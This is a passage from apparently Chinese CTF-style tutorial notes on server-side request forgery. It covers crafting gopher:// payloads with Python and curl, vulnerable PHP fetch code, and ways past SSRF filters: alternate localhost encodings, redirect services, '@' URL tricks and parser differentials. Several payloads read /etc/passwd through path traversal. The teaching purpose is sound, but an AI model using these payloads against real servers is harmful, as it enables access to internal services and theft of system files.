<p>\u73b0\u5728\u7684Gopher\u534f\u8bae\u5df2\u7ecf\u5f88\u5c11\u6709\u4eba\u518d\u4f7f\u7528\u5b83\u4e86\uff0c\u4f46\u662f\u8be5\u534f\u8bae\u5728SSRF\u4e2d\u5374\u53ef\u4ee5\u53d1\u6325\u5de8\u5927\u7684\u4f5c\u7528\uff0c\u53ef\u4ee5\u8bf4\u662fSSRF\u4e2d\u7684\u4e07\u91d1\u6cb9\u3002\u7531\u4e8eGopher\u534f\u8bae\u652f\u6301\u53d1\u51faGET\u3001POST\u8bf7\u6c42\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u622a\u83b7GET\u8bf7\u6c42\u5305\u548cPOST\u8bf7\u6c42\u5305\uff0c\u518d\u6784\u9020\u6210\u7b26\u5408Gopher\u534f\u8bae\u8bf7\u6c42\u7684payload\u8fdb\u884cSSRF\u5229\u7528\uff0c\u751a\u81f3\u53ef\u4ee5\u7528\u5b83\u6765\u653b\u51fb\u5185\u7f51\u4e2d\u7684Redis\u3001MySql\u3001FastCGI\u7b49\u5e94\u7528\uff0c\u8fd9\u65e0\u7591\u5927\u5927\u6269\u5c55\u4e86\u6211\u4eec\u7684SSRF\u653b\u51fb\u9762\u3002</p> <p>\uff081\uff09Gopher\u534f\u8bae\u683c\u5f0f</p> <pre><code>URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_\u540e\u63a5TCP\u6570\u636e\u6d41\u200b# \u6ce8\u610f\u4e0d\u8981\u5fd8\u8bb0\u540e\u9762\u90a3\u4e2a\u4e0b\u5212\u7ebf\"_\"\uff0c\u4e0b\u5212\u7ebf\"_\"\u540e\u9762\u624d\u5f00\u59cb\u63a5TCP\u6570\u636e\u6d41\uff0c\u5982\u679c\u4e0d\u52a0\u8fd9\u4e2a\"_\"\uff0c\u90a3\u4e48\u670d\u52a1\u7aef\u6536\u5230\u7684\u6d88\u606f\u5c06\u4e0d\u662f\u5b8c\u6574\u7684\uff0c\u8be5\u5b57\u7b26\u53ef\u968f\u610f\u5199\u3002\nPlain Text\n</code></pre> <p>gopher\u7684\u9ed8\u8ba4\u7aef\u53e3\u662f70</p> <ul> <li> <p>\u5982\u679c\u53d1\u8d77POST\u8bf7\u6c42\uff0c\u56de\u8f66\u6362\u884c\u9700\u8981\u4f7f\u7528<code>%0d%0a</code>\u6765\u4ee3\u66ff<code>%0a</code>\uff0c\u5982\u679c\u591a\u4e2a\u53c2\u6570\uff0c\u53c2\u6570\u4e4b\u95f4\u7684&amp;\u4e5f\u9700\u8981\u8fdb\u884cURL\u7f16\u7801</p> </li> <li> <p>\u90a3\u4e48\u5982\u4f55\u5229\u7528Gopher\u53d1\u9001HTTP\u7684\u8bf7\u6c42\u5462\uff1f\u4f8b\u5982GET\u8bf7\u6c42\u3002\u6211\u4eec\u76f4\u63a5\u53d1\u9001\u4e00\u4e2a\u539f\u59cb\u7684HTTP\u5305\u4e0d\u5c31\u884c\u4e86\u5417\u3002\u5728gopher\u534f\u8bae\u4e2d\u53d1\u9001HTTP\u7684\u6570\u636e\uff0c\u9700\u8981\u4ee5\u4e0b\u4e09\u6b65\uff1a</p> </li> </ul> <p>\uff082\uff09\u5229\u7528Gopher\u534f\u8bae\u53d1\u9001HTTP GET\u8bf7\u6c42</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// echo.php&lt;?phpecho \"Hello \".$_GET[\"whoami\"].\"\\n\"?&gt;\nPlain Text\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u6784\u9020payload\u3002\u4e00\u4e2a\u5178\u578b\u7684GET\u578b\u7684HTTP\u5305\u7c7b\u4f3c\u5982\u4e0b\uff1a</p> <pre><code>GET /echo.php?whoami=Bunny HTTP/1.1Host: 47.xxx.xxx.72\nPlain Text\n</code></pre> <p>\u7136\u540e\u5229\u7528\u4ee5\u4e0b\u811a\u672c\u8fdb\u884c\u4e00\u6b65\u751f\u6210\u7b26\u5408Gopher\u534f\u8bae\u683c\u5f0f\u7684payload\uff1a</p> <pre><code>import urllib.parsepayload =\\\"\"\"GET /echo.php?whoami=Bunny HTTP/1.1Host: 47.xxx.xxx.72\"\"\" \u00a0# \u6ce8\u610f\u540e\u9762\u4e00\u5b9a\u8981\u6709\u56de\u8f66\uff0c\u56de\u8f66\u7ed3\u5c3e\u8868\u793ahttp\u8bf7\u6c42\u7ed3\u675ftmp = urllib.parse.quote(payload)new = tmp.replace('%0A','%0D%0A')result = 'gopher://47.xxx.xxx.72:80/'+'_'+newprint(result)\nPlain Text\n</code></pre> <p></p> <p>\u6ce8\u610f\u8fd9\u51e0\u4e2a\u95ee\u9898\uff1a</p> <p>\u7136\u540e\u6267\u884c\uff1a</p> <pre><code>curl gopher://47.xxx.xxx.72:80/_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A\nPlain Text\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\uff0c\u6210\u529f\u7528GET\u65b9\u6cd5\u4f20\u53c2\u5e76\u8f93\u51fa\u201cHello Bunny\u201d\u3002</p> <p>\uff083\uff09\u5229\u7528Gopher\u534f\u8bae\u53d1\u9001HTTP POST\u8bf7\u6c42</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// echo.php&lt;?phpecho \"Hello \".$_POST[\"whoami\"].\"\\n\"?&gt;\nPlain Text\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u6784\u9020payload\u3002\u4e00\u4e2a\u5178\u578b\u7684POST\u578b\u7684HTTP\u5305\u7c7b\u4f3c\u5982\u4e0b\uff1a</p> <pre><code>POST /echo.php HTTP/1.1Host: 47.xxx.xxx.72Content-Type: application/x-www-form-urlencodedContent-Length: 12\nwhoami=Bunny\nPlain Text\n</code></pre> <p>\u6ce8\u610f\uff1a\u4e0a\u9762\u90a3\u56db\u4e2aHTTP\u5934\u662fPOST\u8bf7\u6c42\u5fc5\u987b\u7684\uff0c\u5373POST\u3001Host\u3001Content-Type\u548cContent-Length\u3002\u5982\u679c\u5c11\u4e86\u4f1a\u62a5\u9519\u7684\uff0c\u800cGET\u5219\u4e0d\u7528\u3002\u5e76\u4e14\uff0c\u7279\u522b\u8981\u6ce8\u610fContent-Length\u5e94\u4e3a\u5b57\u7b26\u4e32\u201cwhoami=Bunny\u201d\u7684\u957f\u5ea6\u3002</p> <p>\u6700\u540e\u7528\u811a\u672c\u6211\u4eec\u5c06\u4e0a\u9762\u7684POST\u6570\u636e\u5305\u8fdb\u884cURL\u7f16\u7801\u5e76\u6539\u4e3agopher\u534f\u8bae</p> <pre><code>import urllib.parsepayload =\\\"\"\"POST /echo.php HTTP/1.1Host: 47.xxx.xxx.72Content-Type: application/x-www-form-urlencodedContent-Length: 12\nwhoami=Bunny\"\"\"  # \u6ce8\u610f\u540e\u9762\u4e00\u5b9a\u8981\u6709\u56de\u8f66\uff0c\u56de\u8f66\u7ed3\u5c3e\u8868\u793ahttp\u8bf7\u6c42\u7ed3\u675ftmp = urllib.parse.quote(payload)new = tmp.replace('%0A','%0D%0A')result = 'gopher://47.xxx.xxx.72:80/'+'_'+newprint(result)\nPlain Text\n</code></pre> <p></p> <p>\u7136\u540e\u6267\u884c\uff1a</p> <pre><code>curl gopher://47.xxx.xxx.72:80/_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A\nPlain Text\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\uff0c\u6210\u529f\u7528POST\u65b9\u6cd5\u4f20\u53c2\u5e76\u8f93\u51fa\u201cHello Bunny\u201d\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/","title":"SSRF","text":"<p>\u8fd9\u4e2a\u7f51\u4e0a\u8d44\u6599\u5c31\u591a\u5f88\u591a\u4e86\u6211\u9009\u62e9copy</p> <p>\u81ea\u5df1\u6765\u5199\u4e0d\u77e5\u9053\u54ea\u91cc\u5f00\u59cb\u5199\u8d77\u6765</p> <p>SSRF(Server-Side Request Forgery:\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020)\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF\u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u7f51\u3002\uff08\u6b63\u56e0\u4e3a\u5b83\u662f\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u7684\uff0c\u6240\u4ee5\u5b83\u80fd\u591f\u8bf7\u6c42\u5230\u4e0e\u5b83\u76f8\u8fde\u800c\u4e0e\u5916\u7f51\u9694\u79bb\u7684\u5185\u7f51\uff09</p> <p>SSRF\u5f62\u6210\u7684\u539f\u56e0\u5927\u90fd\u662f\u7531\u4e8e\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u505a\u8fc7\u6ee4\u548c\u9650\u5236\u3002\u5373SSRF\u6f0f\u6d1e\u5c31\u662f\u901a\u8fc7\u7be1\u6539\u83b7\u53d6\u8d44\u6e90\u7684\u8bf7\u6c42\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u4f46\u662f\u670d\u52a1\u5668\u5e76\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e2a\u8bf7\u6c42\u662f\u975e\u6cd5\u7684\uff0c\u7136\u540e\u670d\u52a1\u5668\u4ee5\u4ed6\u7684\u8eab\u4efd\u6765\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u5668\u7684\u8d44\u6e90\u3002</p> <p></p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#_1","title":"\u6f0f\u6d1e\u51fd\u6570","text":"<p>SSRF\u6f0f\u6d1e\u76f8\u5173\u51fd\u6570\u548c\u7c7b</p> <p>file_get_contents()\uff1a\u5c06\u6574\u4e2a\u6587\u4ef6\u6216\u4e00\u4e2aurl\u6240\u6307\u5411\u7684\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u3002</p> <ul> <li> <p>readfile()\uff1a\u8f93\u51fa\u4e00\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002</p> </li> <li> <p>fsockopen()\uff1a\u6253\u5f00\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u6216\u8005\u4e00\u4e2aUnix \u5957\u63a5\u5b57\u8fde\u63a5\u3002</p> </li> <li> <p>curl_exec()\uff1a\u521d\u59cb\u5316\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd\uff0c\u8fd4\u56de\u4e00\u4e2acURL\u53e5\u67c4\uff0c\u4f9bcurl_setopt()\uff0ccurl_exec()\u548ccurl_close() \u51fd\u6570\u4f7f\u7528\u3002</p> </li> <li> <p>fopen()\uff1a\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u6587\u4ef6\u6216\u8005 URL\u3002</p> </li> <li> <p>\u4e0a\u8ff0\u51fd\u6570\u51fd\u6570\u4f7f\u7528\u4e0d\u5f53\u4f1a\u9020\u6210SSRF\u6f0f\u6d1e\u3002 \u6b64\u5916\uff0cPHP\u539f\u751f\u7c7bSoapClient\u5728\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u65f6\u53ef\u5bfc\u81f4SSRF\u3002(\u8bb0\u5f97\u5417\uff1f\u4e4b\u524d\u7684soapclient,ssrf+crlf)</p> </li> </ul>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#file_get_contents","title":"file_get_contents()","text":"<p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?php$url = $_GET['url'];;echo file_get_contents($url);?&gt;\nPlain Text\n</code></pre> <p>\u4e0a\u8ff0\u6d4b\u8bd5\u4ee3\u7801\u4e2d\uff0cfile_get_contents() \u51fd\u6570\u5c06\u6574\u4e2a\u6587\u4ef6\u6216\u4e00\u4e2aurl\u6240\u6307\u5411\u7684\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u5e76\u5c55\u793a\u7ed9\u7528\u6237\uff0c\u6211\u4eec\u6784\u9020\u7c7b\u4f3c<code>ssrf.php?url=../../../../../etc/passwd</code>\u7684paylaod\u5373\u53ef\u8bfb\u53d6\u670d\u52a1\u5668\u672c\u5730\u7684\u4efb\u610f\u6587\u4ef6\u3002(\u8def\u5f84\u7a7f\u8d8a\uff0c\u5199\u5230\u540e\u9762\u662f\u6709\u4e1c\u897f\u4e32\u8d77\u6765\u7684)</p> <p></p> <p>readfile()\u51fd\u6570\u4e0efile_get_contents()\u51fd\u6570\u76f8\u4f3c\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#fsockopen","title":"fsockopen()","text":"<p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>\u7528\u4e8e\u6253\u5f00\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u6216\u8005\u4e00\u4e2aUnix \u5957\u63a5\u5b57\u8fde\u63a5\uff0c\u521d\u59cb\u5316\u4e00\u4e2a\u5957\u63a5\u5b57\u8fde\u63a5\u5230\u6307\u5b9a\u4e3b\u673a\uff08hostname\uff09\uff0c\u5b9e\u73b0\u5bf9\u7528\u6237\u6307\u5b9aurl\u6570\u636e\u7684\u83b7\u53d6\u3002\u8be5\u51fd\u6570\u4f1a\u4f7f\u7528socket\u8ddf\u670d\u52a1\u5668\u5efa\u7acbtcp\u8fde\u63a5\uff0c\u8fdb\u884c\u4f20\u8f93\u539f\u59cb\u6570\u636e\u3002 fsockopen()\u5c06\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u53e5\u67c4\uff0c\u4e4b\u540e\u53ef\u4ee5\u88ab\u5176\u4ed6\u6587\u4ef6\u7c7b\u51fd\u6570\u8c03\u7528\uff08\u4f8b\u5982\uff1afgets()\uff0cfgetss()\uff0cfwrite()\uff0cfclose()\u8fd8\u6709feof()\uff09\u3002\u5982\u679c\u8c03\u7528\u5931\u8d25\uff0c\u5c06\u8fd4\u56defalse\u3002</p> <pre><code>// ssrf.php\n&lt;?php\n$host=$_GET['url'];\n$fp = fsockopen($host, 80, $errno, $errstr, 30);\nif (!$fp) {\necho \"$errstr ($errno)&lt;br /&gt;\\n\";\n} else {\n$out = \"GET / HTTP/1.1\\r\\n\";\n$out .= \"Host: $host\\r\\n\";\n$out .= \"Connection: Close\\r\\n\\r\\n\";\nfwrite($fp, $out);\nwhile (!feof($fp)) {\necho fgets($fp, 128);\n}\nfclose($fp);\n}\n?&gt;\nPlain Text\n</code></pre> <p>\u6784\u9020<code>ssrf.php?url=www.baidu.com</code>\u5373\u53ef\u6210\u529f\u89e6\u53d1ssrf\u5e76\u8fd4\u56de\u767e\u5ea6\u4e3b\u9875\uff1a</p> <p></p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#curl_exec","title":"curl_exec()","text":"<p>curl_init(url)\u51fd\u6570\u521d\u59cb\u5316\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd\uff0c\u8fd4\u56de\u4e00\u4e2acURL\u53e5\u67c4\uff0c\u4f9bcurl_setopt()\uff0ccurl_exec()\u548ccurl_close() \u51fd\u6570\u4f7f\u7528\u3002</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?php if (isset($_GET['url'])){  $link = $_GET['url'];   $curlobj = curl_init(); // \u521b\u5efa\u65b0\u7684 cURL \u8d44\u6e90 curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // \u8bbe\u7f6e URL \u548c\u76f8\u5e94\u7684\u9009\u9879  $result=curl_exec($curlobj); // \u6293\u53d6 URL \u5e76\u628a\u5b83\u4f20\u9012\u7ed9\u6d4f\u89c8\u5668    curl_close($curlobj); // \u5173\u95ed cURL \u8d44\u6e90\uff0c\u5e76\u4e14\u91ca\u653e\u7cfb\u7edf\u8d44\u6e90    // $filename = './curled/'.rand().'.txt';   // file_put_contents($filename, $result);   echo $result;}?&gt;\nPlain Text\n</code></pre> <p>\u6784\u9020<code>ssrf.php?url=www.baidu.com</code>\u5373\u53ef\u6210\u529f\u89e6\u53d1ssrf\u5e76\u8fd4\u56de\u767e\u5ea6\u4e3b\u9875\uff1a</p> <p></p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#soapclient","title":"SoapClient","text":"<p>\u7701\u7565\u4e86</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#_2","title":"\u7ed5\u8fc7\u59ff\u52bf","text":"<p>\u5bf9\u4e8eSSRF\u7684\u9650\u5236\u5927\u81f4\u6709\u5982\u4e0b\u51e0\u79cd\uff1a</p> <p>\u9650\u5236\u8bf7\u6c42\u7684\u7aef\u53e3\u53ea\u80fd\u4e3aWeb\u7aef\u53e3\uff0c\u53ea\u5141\u8bb8\u8bbf\u95eeHTTP\u548cHTTPS\u7684\u8bf7\u6c42\u3002</p> <ul> <li>\u9650\u5236\u57df\u540d\u53ea\u80fd\u4e3ahttp://www.xxx.com</li> </ul> <p>\u9650\u5236\u4e0d\u80fd\u8bbf\u95ee\u5185\u7f51\u7684IP\uff0c\u4ee5\u9632\u6b62\u5bf9\u5185\u7f51\u8fdb\u884c\u653b\u51fb\u3002</p> <ul> <li> <p>\u5c4f\u853d\u8fd4\u56de\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> </li> <li></li> </ul>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#http","title":"\u5229\u7528HTTP\u57fa\u672c\u8eab\u4efd\u8ba4\u8bc1\u7684\u65b9\u5f0f\u7ed5\u8fc7","text":"<p>\u5982\u679c\u76ee\u6807\u4ee3\u7801\u9650\u5236\u8bbf\u95ee\u7684\u57df\u540d\u53ea\u80fd\u4e3ahttp://www.xxx.com\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u91c7\u7528HTTP\u57fa\u672c\u8eab\u4efd\u8ba4\u8bc1\u7684\u65b9\u5f0f\u7ed5\u8fc7\u3002\u5373@\uff1ahttp://www.xxx.com@www.evil.com</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#302ip","title":"\u5229\u7528302\u8df3\u8f6c\u7ed5\u8fc7\u5185\u7f51IP","text":"<p>\u7ed5\u8fc7\u5bf9\u5185\u7f51ip\u7684\u9650\u5236\u6211\u4eec\u53ef\u4ee5\u5229\u7528302\u8df3\u8f6c\u7684\u65b9\u6cd5\uff0c\u6709\u4ee5\u4e0b\u4e24\u79cd\u3002</p> <p>\uff081\uff09\u7f51\u7edc\u4e0a\u5b58\u5728\u4e00\u4e2a\u5f88\u795e\u5947\u7684\u670d\u52a1\uff0c\u7f51\u5740\u4e3ahttp://xip.io\uff0c\u5f53\u8bbf\u95ee\u8fd9\u4e2a\u670d\u52a1\u7684\u4efb\u610f\u5b50\u57df\u540d\u7684\u65f6\u5019\uff0c\u90fd\u4f1a\u91cd\u5b9a\u5411\u5230\u8fd9\u4e2a\u5b50\u57df\u540d\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a</p> <p>\u5f53\u6211\u4eec\u8bbf\u95ee\uff1ahttp://127.0.0.1.xip.io/flag.php\u65f6\uff0c\u5b9e\u9645\u8bbf\u95ee\u7684\u662fhttp://127.0.0.1/1.php\u3002\u50cf\u8fd9\u79cd\u7f51\u5740\u8fd8\u6709http://nip.io\uff0chttp://sslip.io\u3002</p> <p>\u5982\u4e0b\u793a\u4f8b\uff08flag.php\u4ec5\u80fd\u4ece\u672c\u5730\u8bbf\u95ee\uff09\uff1a</p> <p></p> <p>\uff082\uff09\u77ed\u5730\u5740\u8df3\u8f6c\u7ed5\u8fc7\uff0c\u8fd9\u91cc\u4e5f\u7ed9\u51fa\u4e00\u4e2a\u7f51\u5740https://4m.cn/\uff1a</p> <p></p> <p>\u76f4\u63a5\u4f7f\u7528\u751f\u6210\u7684\u77ed\u8fde\u63a5https://4m.cn/FjOdQ\u5c31\u4f1a\u81ea\u52a8302\u8df3\u8f6c\u5230http://127.0.0.1/flag.php\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u7ed5\u8fc7WAF\u4e86\uff1a</p> <p></p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#ip","title":"\u8fdb\u5236\u7684\u8f6c\u6362\u7ed5\u8fc7\u5185\u7f51IP","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u4e0d\u540c\u7684\u8fdb\u5236\u66ff\u4ee3ip\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e2a\u4ece\u7f51\u4e0a\u6252\u7684php\u811a\u672c\u53ef\u4ee5\u4e00\u952e\u8f6c\u6362\uff1a</p> <pre><code>&lt;?php$ip = '127.0.0.1';$ip = explode('.',$ip);$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;if($r &lt; 0) {$r += 4294967296;}echo \"\u5341\u8fdb\u5236:\"; \u00a0 \u00a0 // 2130706433echo $r;echo \"\u516b\u8fdb\u5236:\"; \u00a0 \u00a0 // 0177.0.0.1echo decoct($r);echo \"\u5341\u516d\u8fdb\u5236:\"; \u00a0 // 0x7f.0.0.1echo dechex($r);?&gt;\nPlain Text\n</code></pre>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#127001","title":"\u5176\u4ed6\u5404\u79cd\u6307\u5411127.0.0.1\u7684\u5730\u5740","text":"<pre><code>http://localhost/ \u00a0 \u00a0 \u00a0 \u00a0 # localhost\u5c31\u662f\u4ee3\u6307127.0.0.1http://0/ \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 # 0\u5728window\u4e0b\u4ee3\u88680.0.0.0\uff0c\u800c\u5728liunx\u4e0b\u4ee3\u8868127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/ \u00a0 \u00a0# \u5728liunx\u4e0b\u53ef\u7528\uff0cwindow\u6d4b\u8bd5\u4e86\u4e0b\u4e0d\u884chttp://[::]:80/ \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 # \u5728liunx\u4e0b\u53ef\u7528\uff0cwindow\u6d4b\u8bd5\u4e86\u4e0b\u4e0d\u884chttp://127\u30020\u30020\u30021/ \u00a0 \u00a0 \u00a0 # \u7528\u4e2d\u6587\u53e5\u53f7\u7ed5\u8fc7http://\u2460\u2461\u2466.\u24ea.\u24ea.\u2460http://127.1/http://127.00000.00000.001/ # 0\u7684\u6570\u91cf\u591a\u4e00\u70b9\u5c11\u4e00\u70b9\u90fd\u6ca1\u5f71\u54cd\uff0c\u6700\u540e\u8fd8\u662f\u4f1a\u6307\u5411127.0.0.1\nPlain Text\n</code></pre>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#_3","title":"\u5229\u7528\u4e0d\u5b58\u5728\u7684\u534f\u8bae\u5934\u7ed5\u8fc7\u6307\u5b9a\u7684\u534f\u8bae\u5934","text":"<p><code>file_get_contents()</code>\u51fd\u6570\u7684\u4e00\u4e2a\u7279\u6027\uff0c\u5373\u5f53PHP\u7684<code>file_get_contents()</code>\u51fd\u6570\u5728\u9047\u5230\u4e0d\u8ba4\u8bc6\u7684\u534f\u8bae\u5934\u65f6\u5019\u4f1a\u5c06\u8fd9\u4e2a\u534f\u8bae\u5934\u5f53\u505a\u6587\u4ef6\u5939\uff0c\u9020\u6210\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u8fd9\u65f6\u5019\u53ea\u9700\u4e0d\u65ad\u5f80\u4e0a\u8df3\u8f6c\u76ee\u5f55\u5373\u53ef\u8bfb\u5230\u6839\u76ee\u5f55\u7684\u6587\u4ef6\u3002\uff08include()\u51fd\u6570\u4e5f\u6709\u7c7b\u4f3c\u7684\u7279\u6027\uff09</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?phphighlight_file(__FILE__);if(!preg_match('/^https/is',$_GET['url'])){die(\"no hack\");}echo file_get_contents($_GET['url']);?&gt;\nPlain Text\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u9650\u5236\u4e86url\u53ea\u80fd\u662f\u4ee5https\u5f00\u5934\u7684\u8def\u5f84\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5982\u4e0b\uff1a</p> <pre><code>httpsssss://\nPlain Text\n</code></pre> <p>\u6b64\u65f6<code>file_get_contents()</code>\u51fd\u6570\u9047\u5230\u4e86\u4e0d\u8ba4\u8bc6\u7684\u4f2a\u534f\u8bae\u5934\u201chttpsssss://\u201d\uff0c\u5c31\u4f1a\u5c06\u4ed6\u5f53\u505a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u518d\u914d\u5408\u76ee\u5f55\u7a7f\u8d8a\u5373\u53ef\u8bfb\u53d6\u6587\u4ef6\uff1a</p> <pre><code>ssrf.php?url=httpsssss://../../../../../../etc/passwd\nPlain Text\n</code></pre> <p></p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u5728SSRF\u7684\u4f17\u591a\u534f\u8bae\u88ab\u7981\u6b62\u4e14\u53ea\u80fd\u4f7f\u7528\u5b83\u89c4\u5b9a\u7684\u67d0\u4e9b\u534f\u8bae\u7684\u60c5\u51b5\u4e0b\u6765\u8fdb\u884c\u8bfb\u53d6\u6587\u4ef6\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/ssrf/#url","title":"\u5229\u7528URL\u7684\u89e3\u6790\u95ee\u9898","text":"<p>\u8be5\u601d\u8def\u6765\u81eaOrange Tsai\u6210\u5458\u57282017 BlackHat \u7f8e\u56fd\u9ed1\u5ba2\u5927\u4f1a\u4e0a\u505a\u7684\u9898\u4e3a\u300aA-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages\u300b\u7684\u5206\u4eab\u3002\u4e3b\u8981\u662f\u5229\u7528readfile\u548cparse_url\u51fd\u6570\u7684\u89e3\u6790\u5dee\u5f02\u4ee5\u53cacurl\u548cparse_url\u89e3\u6790\u5dee\u5f02\u6765\u8fdb\u884c\u7ed5\u8fc7\u3002</p> <p>\uff081\uff09\u5229\u7528readfile\u548cparse_url\u51fd\u6570\u7684\u89e3\u6790\u5dee\u5f02\u7ed5\u8fc7\u6307\u5b9a\u7684\u7aef\u53e3</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?php$url = 'http://'. $_GET[url];$parsed = parse_url($url);if( $parsed[port] == 80 ){  // \u8fd9\u91cc\u9650\u5236\u4e86\u6211\u4eec\u4f20\u8fc7\u53bb\u7684url\u53ea\u80fd\u662f80\u7aef\u53e3\u7684    readfile($url);} else { die('Hacker!');}\nPlain Text\n</code></pre> <p>\u7528python\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u8d77\u4e00\u4e2a\u7aef\u53e3\u4e3a11211\u7684WEB\u670d\u52a1\uff1a</p> <p></p> <p>\u4e0a\u8ff0\u4ee3\u7801\u9650\u5236\u4e86\u6211\u4eec\u4f20\u8fc7\u53bb\u7684url\u53ea\u80fd\u662f80\u7aef\u53e3\u7684\uff0c\u4f46\u5982\u679c\u6211\u4eec\u60f3\u53bb\u8bfb\u53d611211\u7aef\u53e3\u7684\u6587\u4ef6\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u4ee5\u4e0b\u65b9\u6cd5\u7ed5\u8fc7\uff1a</p> <pre><code>ssrf.php?url=127.0.0.1:11211:80/flag.txt\nPlain Text\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\u6210\u529f\u8bfb\u53d6\u4e8611211\u7aef\u53e3\u4e2d\u7684flag.txt\u6587\u4ef6\uff0c\u4e0b\u9762\u7528BlackHat\u7684\u56fe\u6765\u8bf4\u660e\u539f\u7406\uff1a</p> <p></p> <p>\u4ece\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u770b\u51fareadfile()\u51fd\u6570\u83b7\u53d6\u7684\u7aef\u53e3\u662f\u6700\u540e\u5192\u53f7\u524d\u9762\u7684\u4e00\u90e8\u5206\uff0811211\uff09\uff0c\u800cparse_url()\u51fd\u6570\u83b7\u53d6\u7684\u5219\u662f\u6700\u540e\u5192\u53f7\u540e\u9762\u7684\u7684\u7aef\u53e3\uff0880\uff09\uff0c\u5229\u7528\u8fd9\u79cd\u5dee\u5f02\u7684\u4e0d\u540c\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u3002</p> <p>\u8fd9\u4e24\u4e2a\u51fd\u6570\u5728\u89e3\u6790host\u7684\u65f6\u5019\u4e5f\u6709\u5dee\u5f02\uff0c\u5982\u4e0b\u56fe\uff1a</p> <p></p> 